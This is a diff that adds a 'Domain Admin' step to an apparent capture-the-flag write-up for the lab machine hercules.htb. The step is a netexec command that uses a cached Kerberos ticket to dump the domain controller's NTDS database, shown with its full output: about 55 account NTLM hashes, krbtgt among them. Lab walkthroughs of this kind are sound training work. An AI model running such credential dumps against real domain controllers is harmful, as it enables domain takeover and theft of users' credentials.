@@ -1643,6 +1643,75 @@ export KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
 
 Then export it!
 
+# Domain Admin
+
+```python
+nxc smb dc.hercules.htb --use-kcache --ntds                                              
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\Administrator from ccache (Pwn3d!)
+SMB         dc.hercules.htb 445    dc               [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc.hercules.htb 445    dc               Administrator:500:aad3b435b51404eeaad3b435b51404ee:56855ee6b7570edefde6ac262200756e:::
+SMB         dc.hercules.htb 445    dc               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         dc.hercules.htb 445    dc               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:aa9d05e554420b27186ffe97882303c2:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\jessica.e:1113:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\mikayla.a:1114:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\stephanie.w:1115:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\johanna.f:1116:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\heather.s:1117:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\camilla.b:1118:aad3b435b51404eeaad3b435b51404ee:75a83e8aa1b31e425f01c91f3ac5e049:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\iis_administrator:1119:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\taylor.m:1120:aad3b435b51404eeaad3b435b51404ee:952294bde2537ad3568133085a74d4b2:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\fernando.r:1121:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\james.s:1122:aad3b435b51404eeaad3b435b51404ee:c23578256755003649011ee7c9fef7b2:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\anthony.r:1123:aad3b435b51404eeaad3b435b51404ee:c23578256755003649011ee7c9fef7b2:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\iis_webserver$:1124:aad3b435b51404eeaad3b435b51404ee:a9f4d76cdc5ba32d6e0763da9d106eb7:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\iis_hadesapppool$:1125:aad3b435b51404eeaad3b435b51404ee:d5c8594cd155ad4d55ed928f8d158d33:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\iis_apppoolidentity$:1126:aad3b435b51404eeaad3b435b51404ee:d5c8594cd155ad4d55ed928f8d158d33:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\iis_defaultapppool$:1127:aad3b435b51404eeaad3b435b51404ee:d5c8594cd155ad4d55ed928f8d158d33:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\auditor:1128:aad3b435b51404eeaad3b435b51404ee:a9285c625af80519ad784729655ff325:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\vincent.g:1129:aad3b435b51404eeaad3b435b51404ee:1d1b98effbbab0dd5ff56d95912d8a50:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\nate.h:1130:aad3b435b51404eeaad3b435b51404ee:1d1b98effbbab0dd5ff56d95912d8a50:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\stephen.m:1131:aad3b435b51404eeaad3b435b51404ee:9aaaedcb19e612216a2dac9badb3c210:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\mark.s:1132:aad3b435b51404eeaad3b435b51404ee:9aaaedcb19e612216a2dac9badb3c210:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\elijah.m:1133:aad3b435b51404eeaad3b435b51404ee:1d1b98effbbab0dd5ff56d95912d8a50:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\angelo.o:1134:aad3b435b51404eeaad3b435b51404ee:1d1b98effbbab0dd5ff56d95912d8a50:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\ashley.b:1135:aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\clarissa.c:1136:aad3b435b51404eeaad3b435b51404ee:924ebb8d5e7f953241252cf64e84ee58:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\winda.s:1137:aad3b435b51404eeaad3b435b51404ee:924ebb8d5e7f953241252cf64e84ee58:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\rene.s:1138:aad3b435b51404eeaad3b435b51404ee:924ebb8d5e7f953241252cf64e84ee58:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\will.s:1139:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\zeke.s:1140:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\adriana.i:1141:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\tish.c:1142:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\jennifer.a:1143:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\shae.j:1144:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\joel.c:1145:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\jacob.b:1146:aad3b435b51404eeaad3b435b51404ee:d620c64ffab6d700658d26648c6c7b65:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\web_admin:1147:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\bob.w:1148:aad3b435b51404eeaad3b435b51404ee:8a65c74e8f0073babbfac6725c66cc3f:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\ken.w:1149:aad3b435b51404eeaad3b435b51404ee:bbe608565f201166999904e40c967c7b:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\johnathan.j:1150:aad3b435b51404eeaad3b435b51404ee:5809e5fc2ca162d909b15c62d7c3707c:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\harris.d:1151:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\ray.n:1152:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\natalie.a:1153:aad3b435b51404eeaad3b435b51404ee:a023eb224e137b1c28de1a50d12519d5:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\ramona.l:1154:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\fiona.c:1155:aad3b435b51404eeaad3b435b51404ee:bba073b6255e15b30ac6204d67933ad8:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\patrick.s:1156:aad3b435b51404eeaad3b435b51404ee:08cbc306325b2ef9da7bbdb85e528613:::
+SMB         dc.hercules.htb 445    dc               hercules.htb\tanya.r:1157:aad3b435b51404eeaad3b435b51404ee:08cbc306325b2ef9da7bbdb85e528613:::
+SMB         dc.hercules.htb 445    dc               Admin:5103:aad3b435b51404eeaad3b435b51404ee:ef0e8c35557ed7790eb8499fc1c24fb6:::
+SMB         dc.hercules.htb 445    dc               DC$:1000:aad3b435b51404eeaad3b435b51404ee:37229f3b87fa161bc3aeda8d67c6e44d:::
+SMB         dc.hercules.htb 445    dc               WINSRV01-2016$:1158:aad3b435b51404eeaad3b435b51404ee:989f931779b1379c6345b6e2773244a0:::
+SMB         dc.hercules.htb 445    dc               WINSRV02-2016$:1159:aad3b435b51404eeaad3b435b51404ee:bb32a35136321fb9cd41374a1a62b14a:::
+SMB         dc.hercules.htb 445    dc               WINSRV03-2016$:1160:aad3b435b51404eeaad3b435b51404ee:68f03b6856cf02e7c1ddac0758ca6b25:::
+SMB         dc.hercules.htb 445    dc               ENTERPRISE01-8.1$:1161:aad3b435b51404eeaad3b435b51404ee:dc6d40433d403e925d4f1848ceeef91f:::
+SMB         dc.hercules.htb 445    dc               ENTERPRISE02-8.1$:1162:aad3b435b51404eeaad3b435b51404ee:90ccdd29525c3b6d29428f932f754171:::
+SMB         dc.hercules.htb 445    dc               [+] Dumped 55 NTDS hashes to /home/kali/.nxc/logs/ntds/dc_dc.hercules.htb_2026-09-16_221634.ntds of which 45 were added to the database
+SMB         dc.hercules.htb 445    dc               [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         dc.hercules.htb 445    dc               [*] grep -iv disabled /home/kali/.nxc/logs/ntds/dc_dc.hercules.htb_2026-09-16_221634.ntds | cut -d ':' -f1
+```
+
+Ill then dump the NTDS
+
 ```python
 
 ```
